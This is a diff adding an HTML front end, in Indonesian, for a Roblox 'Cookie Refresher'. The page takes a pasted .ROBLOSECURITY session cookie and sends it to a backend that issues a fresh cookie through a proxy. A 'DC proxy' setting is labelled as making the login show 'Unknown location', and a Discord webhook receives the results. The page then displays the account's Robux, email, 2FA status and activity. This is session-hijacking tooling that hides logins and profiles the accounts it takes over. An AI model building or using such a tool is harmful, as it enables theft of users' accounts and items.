@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cookie Refresher</title>
+<style>
+:root {
+  --bg: #0d0f14;
+  --surface: #141720;
+  --surface2: #1c2030;
+  --border: #252a3a;
+  --accent: #5865f2;
+  --accent2: #4752c4;
+  --green: #23a559;
+  --red: #f23f42;
+  --yellow: #f0b132;
+  --purple: #9b59b6;
+  --text: #e3e5e8;
+  --muted: #72767d;
+  --r: 10px;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:28px 16px 60px;}
+header{text-align:center;margin-bottom:28px;}
+header h1{font-size:1.7rem;font-weight:700;letter-spacing:-.5px;}
+header h1 span{color:var(--accent);}
+header p{color:var(--muted);font-size:.85rem;margin-top:5px;}
+.wrap{width:100%;max-width:600px;}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:20px;margin-bottom:14px;}
+.card-title{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:14px;}
+label{display:block;font-size:.85rem;font-weight:500;margin-bottom:6px;}
+textarea,input[type=text]{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:.85rem;font-family:'Consolas',monospace;padding:10px 12px;resize:vertical;outline:none;transition:border-color .15s;}
+textarea:focus,input[type=text]:focus{border-color:var(--accent);}
+textarea{min-height:85px;}
+.check-row{display:flex;align-items:center;gap:10px;margin-top:12px;cursor:pointer;user-select:none;}
+.check-row input{width:15px;height:15px;accent-color:var(--accent);cursor:pointer;}
+.check-row span{font-size:.875rem;}
+.btn-row{display:flex;gap:10px;margin-top:16px;}
+button{flex:1;padding:11px 16px;border:none;border-radius:6px;font-size:.88rem;font-weight:600;cursor:pointer;transition:background .15s,transform .1s;}
+button:active{transform:scale(.98);}
+.btn-p{background:var(--accent);color:#fff;}
+.btn-p:hover{background:var(--accent2);}
+.btn-p:disabled{background:#3a3f55;color:var(--muted);cursor:not-allowed;}
+.btn-s{background:var(--surface2);color:var(--text);border:1px solid var(--border);flex:0 0 auto;padding:11px 14px;}
+.btn-s:hover{background:var(--border);}
+.sbar{display:none;align-items:center;gap:8px;padding:10px 14px;border-radius:6px;font-size:.84rem;margin-top:12px;}
+.sbar.info{background:#1a1f35;border:1px solid #2d3458;color:#8b9cf4;display:flex;}
+.sbar.ok{background:#1a2a1a;border:1px solid #1a4520;color:#3ba55d;display:flex;}
+.sbar.err{background:#2a1a1a;border:1px solid #4a1f20;color:var(--red);display:flex;}
+.dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.dot.spin{border:2px solid var(--accent);border-top-color:transparent;animation:spin .8s linear infinite;background:transparent;}
+.dot.g{background:var(--green);}
+.dot.r{background:var(--red);}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+/* Profile Card */
+.profile-header{display:flex;align-items:center;gap:16px;padding-bottom:16px;margin-bottom:16px;border-bottom:1px solid var(--border);}
+.avatar-wrap{position:relative;flex-shrink:0;}
+.avatar-wrap img{width:64px;height:64px;border-radius:50%;border:3px solid var(--accent);object-fit:cover;}
+.premium-badge{position:absolute;bottom:-2px;right:-2px;background:#f0b132;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;border:2px solid var(--surface);}
+.profile-info .name{font-size:1.1rem;font-weight:700;}
+.profile-info .handle{font-size:.8rem;color:var(--muted);margin-top:2px;}
+.profile-info .uid{font-size:.75rem;color:var(--muted);margin-top:1px;}
+.profile-info .desc{font-size:.8rem;color:var(--muted);margin-top:5px;max-width:380px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+
+/* Stat grid */
+.stat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:12px;}
+.stat-grid.two{grid-template-columns:repeat(2,1fr);}
+.stat{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;}
+.stat .val{font-size:1.05rem;font-weight:700;}
+.stat .val.green{color:var(--green);}
+.stat .val.yellow{color:var(--yellow);}
+.stat .val.purple{color:var(--purple);}
+.stat .val.red{color:var(--red);}
+.stat .key{font-size:.68rem;color:var(--muted);margin-top:3px;text-transform:uppercase;letter-spacing:.05em;}
+
+/* Security row */
+.sec-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);font-size:.85rem;}
+.sec-row:last-child{border-bottom:none;}
+.sec-label{color:var(--muted);}
+.badge{padding:2px 9px;border-radius:20px;font-size:.72rem;font-weight:700;}
+.badge.on{background:#1a3a20;color:var(--green);border:1px solid #1f5028;}
+.badge.off{background:#3a1a1a;color:var(--red);border:1px solid #5a2020;}
+.badge.warn{background:#3a2a0a;color:var(--yellow);border:1px solid #5a4010;}
+.badge.blue{background:#1a1f3a;color:#8b9cf4;border:1px solid #2d3458;}
+
+/* Games list */
+.game-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);font-size:.84rem;}
+.game-row:last-child{border-bottom:none;}
+.game-name{color:var(--text);font-weight:500;}
+.game-status{font-size:.72rem;padding:2px 7px;border-radius:20px;background:#1a2a1a;color:var(--green);border:1px solid #1f5028;}
+
+/* Cookie section */
+.cookie-wrap{position:relative;margin-top:4px;}
+.cookie-wrap textarea{padding-right:76px;font-size:.78rem;}
+.copy-btn{position:absolute;right:8px;top:8px;background:var(--accent);color:#fff;border:none;border-radius:5px;font-size:.72rem;padding:5px 10px;cursor:pointer;font-weight:700;flex:unset;width:auto;}
+.copy-btn:hover{background:var(--accent2);}
+.copy-btn.ok{background:var(--green);}
+
+/* Proxy card */
+.proxy-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-top:10px;}
+
+.hidden{display:none!important;}
+</style>
+</head>
+<body>
+<header>
+  <h1>🍪 Cookie <span>Refresher</span></h1>
+  <p>Refresh Roblox cookie lewat proxy — hasil langsung ke Discord</p>
+  <button class="btn-s" onclick="toggleSettings()" style="margin-top:10px;font-size:.8rem;padding:7px 16px;flex:none;display:inline-block;width:auto;">⚙️ Settings</button>
+</header>
+
+<div class="wrap">
+
+<!-- Settings -->
+<div class="card" id="settingsCard" style="display:none;">
+  <div class="card-title">⚙️ Settings</div>
+  <label>Proxy URL <span style="color:var(--muted);font-size:.75rem;">(buat CSRF + ticket — residential ok)</span></label>
+  <input type="text" id="cfgProxy" placeholder="http://user:pass@host:port" style="margin-bottom:10px;font-size:.82rem;"/>
+  <label>DC Proxy URL <span style="color:var(--yellow);font-size:.75rem;">⭐ buat redeem → cookie jadi Unknown location</span></label>
+  <input type="text" id="cfgDc" placeholder="Kosongkan = pakai proxy utama" style="margin-bottom:10px;font-size:.82rem;"/>
+  <label>Discord Webhook URL</label>
+  <input type="text" id="cfgWebhook" placeholder="https://discord.com/api/webhooks/..." style="margin-bottom:12px;font-size:.82rem;"/>
+  <div class="btn-row">
+    <button class="btn-p" onclick="saveSettings()">💾 Save</button>
+    <button class="btn-s" onclick="toggleSettings()">✕ Close</button>
+  </div>
+  <div class="sbar hidden" id="sSbar" style="margin-top:10px;"></div>
+</div>
+
+<!-- Input -->
+<div class="card">
+  <div class="card-title">Input</div>
+  <label>Roblox Cookie (.ROBLOSECURITY)</label>
+  <textarea id="cookie" placeholder="Paste cookie lu di sini..."></textarea>
+  <label class="check-row">
+    <input type="checkbox" id="showAcc" checked/>
+    <span>Ambil info akun lengkap (Robux, friends, security, dll)</span>
+  </label>
+  <div class="btn-row">
+    <button class="btn-p" id="btnRefresh" onclick="doRefresh()">🔄 Refresh Cookie</button>
+    <button class="btn-s" onclick="checkIP()" title="Cek IP Proxy">🌐 IP</button>
+  </div>
+  <div class="sbar" id="sbar"><div class="dot" id="sdot"></div><span id="stxt"></span></div>
+</div>
+
+<!-- Proxy Status -->
+<div class="card hidden" id="proxyCard">
+  <div class="card-title">Proxy Status</div>
+  <div id="proxyContent"><span style="color:var(--muted);font-size:.85rem;">Loading...</span></div>
+</div>
+
+<!-- Profile Result -->
+<div class="card hidden" id="profileCard">
+  <div class="card-title">Profile</div>
+
+  <!-- Header -->
+  <div class="profile-header">
+    <div class="avatar-wrap">
+      <img id="accAvatar" src="" onerror="this.style.display='none'"/>
+      <div class="premium-badge hidden" id="premBadge">💎</div>
+    </div>
+    <div class="profile-info">
+      <div class="name" id="accName"></div>
+      <div class="handle" id="accHandle"></div>
+      <div class="uid" id="accUid"></div>
+      <div class="desc" id="accDesc"></div>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stat-grid" id="statGrid">
+    <div class="stat"><div class="val green" id="sRobux">0</div><div class="key">Robux</div></div>
+    <div class="stat"><div class="val" id="sFriends">0</div><div class="key">Friends</div></div>
+    <div class="stat"><div class="val" id="sGroups">0</div><div class="key">Groups</div></div>
+    <div class="stat"><div class="val" id="sFollowers">0</div><div class="key">Followers</div></div>
+    <div class="stat"><div class="val" id="sFollowing">0</div><div class="key">Following</div></div>
+    <div class="stat"><div class="val yellow" id="sAge">-</div><div class="key">Account Age</div></div>
+  </div>
+
+  <!-- Security -->
+  <div class="card-title" style="margin-top:14px;">Security</div>
+  <div>
+    <div class="sec-row">
+      <span class="sec-label">2FA</span>
+      <span class="badge off" id="sec2fa">Not Enabled</span>
+    </div>
+    <div class="sec-row">
+      <span class="sec-label">Email</span>
+      <span id="secEmail" style="font-size:.82rem;"></span>
+    </div>
+    <div class="sec-row">
+      <span class="sec-label">Premium</span>
+      <span class="badge off" id="secPrem">No</span>
+    </div>
+    <div class="sec-row">
+      <span class="sec-label">Created</span>
+      <span id="secCreated" style="font-size:.82rem;color:var(--muted);"></span>
+    </div>
+  </div>
+</div>
+
+<!-- Recent Activity -->
+<div class="card hidden" id="gamesCard">
+  <div class="card-title">Recent Activity</div>
+  <div id="gamesList"></div>
+</div>
+
+<!-- New Cookie -->
+<div class="card hidden" id="cookieCard">
+  <div class="card-title">New Cookie Refreshed</div>
+  <div class="cookie-wrap">
+    <textarea id="newCookie" rows="6" readonly></textarea>
+    <button class="copy-btn" id="copyBtn" onclick="copyCookie()">Copy</button>
+  </div>
+</div>
+
+</div><!-- /wrap -->
+
+<script>
+async function checkIP() {
+  const card = document.getElementById('proxyCard');
+  card.classList.remove('hidden');
+  document.getElementById('proxyContent').innerHTML = '<span style="color:var(--muted);font-size:.85rem;">Checking...</span>';
+  showS('info','spin','Cek proxy IP...');
+  try {
+    const res = await fetch('/api/check-ip');
+    const d = await res.json();
+    if (d.success) {
+      const ip = d.ipInfo;
+      document.getElementById('proxyContent').innerHTML = `
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+          <span class="badge ${d.proxyActive?'on':'off'}">${d.proxyActive?'PROXY ON':'DIRECT'}</span>
+          <span style="font-size:.8rem;color:var(--muted);">${d.proxyActive?'Lewat proxy':'Koneksi langsung'}</span>
+        </div>
+        <div class="proxy-grid">
+          <div class="stat"><div class="val" style="font-size:.9rem;">${ip.ip||'-'}</div><div class="key">IP</div></div>
+          <div class="stat"><div class="val" style="font-size:.9rem;">${ip.country||'-'}</div><div class="key">Country</div></div>
+          <div class="stat"><div class="val" style="font-size:.9rem;">${ip.city||'-'}</div><div class="key">City</div></div>
+          <div class="stat"><div class="val" style="font-size:.9rem;">${ip.region||'-'}</div><div class="key">Region</div></div>
+        </div>
+        ${ip.org?`<div style="font-size:.75rem;color:var(--muted);margin-top:8px;">🏢 ${ip.org}</div>`:''}
+      `;
+      showS('ok','g',`IP: ${ip.ip} — ${ip.country||''}`);
+    } else {
+      document.getElementById('proxyContent').innerHTML = `<span style="color:var(--red);font-size:.85rem;">❌ ${d.error}</span>`;
+      showS('err','r', d.error);
+    }
+  } catch(e){ showS('err','r','Gagal: '+e.message); }
+}
+
+async function doRefresh() {
+  const cookie = document.getElementById('cookie').value.trim();
+  if (!cookie) { showS('err','r','Cookie wajib diisi!'); return; }
+  const btn = document.getElementById('btnRefresh');
+  btn.disabled = true; btn.textContent = '⏳ Processing...';
+  ['profileCard','gamesCard','cookieCard'].forEach(id=>document.getElementById(id).classList.add('hidden'));
+  showS('info','spin','Fetching CSRF token...');
+
+  try {
+    const res = await fetch('/api/refresh', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ cookie, showAccountData: document.getElementById('showAcc').checked })
+    });
+    const d = await res.json();
+    if (d.success) {
+      showS('ok','g','Cookie berhasil di-refresh! 🎉');
+      renderResult(d);
+    } else {
+      showS('err','r', d.message || 'Gagal refresh.');
+    }
+  } catch(e){ showS('err','r','Network error: '+e.message); }
+  finally { btn.disabled=false; btn.textContent='🔄 Refresh Cookie'; }
+}
+
+function renderResult(d) {
+  const acc = d.accountInfo;
+
+  // Cookie
+  document.getElementById('newCookie').value = d.newCookie || '';
+  document.getElementById('cookieCard').classList.remove('hidden');
+
+  if (!acc || !acc.userId) return;
+
+  // Profile header
+  const avatar = document.getElementById('accAvatar');
+  if (acc.avatar) { avatar.src = acc.avatar; avatar.style.display = ''; }
+  document.getElementById('accName').textContent = acc.displayName || acc.username;
+  document.getElementById('accHandle').textContent = `@${acc.username}`;
+  document.getElementById('accUid').textContent = `ID: ${acc.userId}`;
+  if (acc.description) document.getElementById('accDesc').textContent = acc.description;
+
+  if (acc.isPremium) document.getElementById('premBadge').classList.remove('hidden');
+
+  // Stats
+  document.getElementById('sRobux').textContent = (acc.robux||0).toLocaleString('en-US');
+  document.getElementById('sFriends').textContent = (acc.friends||0).toLocaleString();
+  document.getElementById('sGroups').textContent = acc.groups||0;
+  document.getElementById('sFollowers').textContent = (acc.followers||0).toLocaleString();
+  document.getElementById('sFollowing').textContent = (acc.following||0).toLocaleString();
+  document.getElementById('sAge').textContent = acc.accountAge ? `${acc.accountAge}y` : '-';
+
+  // Security
+  const el2fa = document.getElementById('sec2fa');
+  if (acc.twoFA) { el2fa.textContent='Enabled'; el2fa.className='badge on'; }
+  else { el2fa.textContent='Not Enabled'; el2fa.className='badge off'; }
+
+  document.getElementById('secEmail').innerHTML = acc.emailVerified
+    ? `<span class="badge on">✅ Verified</span> <span style="font-size:.78rem;color:var(--muted);">${acc.email||''}</span>`
+    : `<span class="badge off">❌ Not Verified</span> <span style="font-size:.78rem;color:var(--muted);">${acc.email||'Not Set'}</span>`;
+
+  const elPrem = document.getElementById('secPrem');
+  if (acc.isPremium) { elPrem.textContent='💎 Yes'; elPrem.className='badge on'; }
+  else { elPrem.textContent='No'; elPrem.className='badge off'; }
+
+  if (acc.created) {
+    const d2 = new Date(acc.created);
+    document.getElementById('secCreated').textContent = d2.toLocaleDateString('en-US',{year:'numeric',month:'short',day:'numeric'});
+  }
+
+  document.getElementById('profileCard').classList.remove('hidden');
+
+  // Recent games
+  if (acc.recentGames && acc.recentGames.length > 0) {
+    document.getElementById('gamesList').innerHTML = acc.recentGames.map(g=>`
+      <div class="game-row">
+        <span class="game-name">🎮 ${g.name}</span>
+        <span class="game-status">${g.status}</span>
+      </div>
+    `).join('');
+    document.getElementById('gamesCard').classList.remove('hidden');
+  }
+}
+
+function copyCookie() {
+  const btn = document.getElementById('copyBtn');
+  navigator.clipboard.writeText(document.getElementById('newCookie').value).then(()=>{
+    btn.textContent='✅ Copied'; btn.classList.add('ok');
+    setTimeout(()=>{ btn.textContent='Copy'; btn.classList.remove('ok'); }, 2000);
+  });
+}
+
+function showS(type, dot, msg) {
+  const bar = document.getElementById('sbar');
+  bar.className = 'sbar '+type;
+  document.getElementById('sdot').className = 'dot '+dot;
+  document.getElementById('stxt').textContent = msg;
+}
+
+async function toggleSettings() {
+  const card = document.getElementById('settingsCard');
+  const isHidden = card.style.display === 'none';
+  if (isHidden) {
+    // Load current config
+    try {
+      const res = await fetch('/api/settings');
+      const d = await res.json();
+      document.getElementById('cfgProxy').value = d.proxyUrl || '';
+      document.getElementById('cfgDc').value = d.dcUrl || '';
+      document.getElementById('cfgWebhook').value = d.webhookUrl || '';
+    } catch(e) {}
+    card.style.display = 'block';
+  } else {
+    card.style.display = 'none';
+  }
+}
+
+async function saveSettings() {
+  const proxyUrl = document.getElementById('cfgProxy').value.trim();
+  const dcUrl = document.getElementById('cfgDc').value.trim();
+  const webhookUrl = document.getElementById('cfgWebhook').value.trim();
+  const sbar = document.getElementById('sSbar');
+  sbar.className = 'sbar info';
+  sbar.innerHTML = '<div class="dot spin"></div><span>Saving...</span>';
+  sbar.classList.remove('hidden');
+  try {
+    const res = await fetch('/api/settings', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ proxyUrl, dcUrl, webhookUrl })
+    });
+    const d = await res.json();
+    if (d.success) {
+      sbar.className = 'sbar ok';
+      sbar.innerHTML = '<div class="dot g"></div><span>Saved! Proxy aktif langsung.</span>';
+      setTimeout(() => { document.getElementById('settingsCard').style.display='none'; checkIP(); }, 1500);
+    } else {
+      sbar.className = 'sbar err';
+      sbar.innerHTML = `<div class="dot r"></div><span>${d.error}</span>`;
+    }
+  } catch(e) {
+    sbar.className = 'sbar err';
+    sbar.innerHTML = `<div class="dot r"></div><span>Error: ${e.message}</span>`;
+  }
+}
+
+window.addEventListener('load', checkIP);
+</script>
+</body>
+</html>
